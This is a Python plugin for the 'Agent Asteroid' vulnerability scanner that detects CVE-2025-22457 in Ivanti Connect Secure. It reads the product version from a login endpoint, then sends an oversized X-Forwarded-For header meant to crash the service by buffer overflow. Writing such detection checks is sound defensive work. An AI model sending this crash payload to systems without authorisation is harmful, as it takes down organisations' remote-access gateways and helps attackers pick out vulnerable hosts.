"""Agent Asteroid implementation for CVE-2025-22457"""

import datetime
import logging
import re
import time
import requests
from packaging import version

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Ivanti Stack-based Buffer Overflow"
VULNERABILITY_REFERENCE = "CVE-2025-22457"
VULNERABILITY_DESCRIPTION = """
A stack-based buffer overflow in Ivanti Connect Secure before version 22.7R2.6, 
Ivanti Policy Secure before version 22.7R1.4, and Ivanti ZTA Gateways before version 22.8R2.2 
allows a remote unauthenticated attacker to achieve remote code execution.
"""
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)
VERSION_PATTERN = re.compile(r'<PARAM NAME="ProductVersion"\s+VALUE="([^"]+)')
PRODUCT_PATTERN = re.compile(r'<PARAM NAME="ProductName"\s+VALUE="([^"]+)')
ENDPOINT = "/dana-na/auth/url_admin/welcome.cgi?type=inter"
PAYLOAD_HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "X-Forwarded-For": "1" * 2048,
}

CONNECT_SECURE_SAFE_VERSION = "22.7R2.6"


def _normalize_version(ver_str: str) -> str:
    """Normalize version string for comparison."""
    # Convert R notation to dot notation (e.g., 22.7R2.6 -> 22.7.2.6)
    return ver_str.replace("R", ".")


def _grab_version_info(target: definitions.Target) -> str | None:
    """Get the product version and name from the target."""
    if target.scheme != "https":
        return None

    try:
        resp = requests.get(
            f"{target.origin}{ENDPOINT}",
            verify=False,
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        if resp.status_code == 200:
            version_match = VERSION_PATTERN.search(resp.text)

            if version_match is not None:
                version_str = version_match.group(1)
                return version_str
    except requests_exceptions.RequestException:
        logging.error("Version check failed for %s", target.origin)
    return None


def _is_vulnerable_version(version_info: str) -> bool:
    """Check if the version is vulnerable based on product type."""
    if version_info is None:
        return False

    version_str = version_info

    try:
        normalized_version = _normalize_version(version_str)
        parsed_ver = version.parse(normalized_version)

        safe_version = _normalize_version(CONNECT_SECURE_SAFE_VERSION)
        return parsed_ver < version.parse(safe_version)

    except version.InvalidVersion:
        logging.error("Could not parse version string: %s", version_str)
    return False


def _check_crash(target: definitions.Target) -> bool:
    """Check if target crashes with crafted payload."""
    try:
        # Step 1: Send payload that should trigger the buffer overflow
        requests.post(
            f"{target.origin}{ENDPOINT}",
            headers=PAYLOAD_HEADERS,
            verify=False,
            timeout=DEFAULT_TIMEOUT.seconds,
        )
        # If we get here without an exception, it's likely not vulnerable
        return False
    except requests_exceptions.ConnectionError:
        # Connection error indicates possible crash from buffer overflow
        try:
            # Step 2: Wait and send follow-up GET to see if service recovered
            time.sleep(1)
            resp = requests.get(
                target.origin,
                verify=False,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            # If we get a 200 response after crash attempt, it's vulnerable
            return resp is not None and resp.status_code == 200
        except requests_exceptions.RequestException:
            # If second request also fails, service may still be down
            return False
    except requests_exceptions.RequestException:
        # Other request exceptions are not indicative of this vulnerability
        return False


@exploits_registry.register
class IvantiConnectSecureExploit(webexploit.WebExploit):
    """
    CVE-2025-22457: Ivanti Connect Secure Buffer Overflow
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """Check if target is a vulnerable Ivanti product."""
        version_info = _grab_version_info(target)
        return version_info is not None and _is_vulnerable_version(version_info)

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Check if target is vulnerable to buffer overflow."""
        vulnerabilities: list[definitions.Vulnerability] = []

        if _check_crash(target) is True:
            vulnerabilities.append(self.create_vulnerability(target))

        return vulnerabilities
